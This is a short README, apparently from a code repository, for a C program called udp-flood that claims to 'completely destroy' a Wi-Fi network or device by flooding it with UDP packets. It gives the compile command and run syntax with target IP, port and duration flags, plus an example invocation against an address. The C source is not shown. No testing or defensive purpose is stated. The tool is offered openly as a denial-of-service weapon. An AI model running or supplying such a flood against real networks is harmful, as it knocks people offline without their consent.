# udp-flood

Completely destroy a wifi network/wifi device by flooding it with UDP packets
Made in C

_____________________

_Compile_

    $ gcc -o udp-flood udp-flood.c
    
_Run_

              $ ./udp-flood --target/-T (TARGET IP)   --duration/-D (DURATION IN SECONDS)    --port/-P (TARGET PORT NO.)
    [EXAMPLE] $ ./udp-flood --target 1.2.3.4 --port 6666 -D 60
    
   
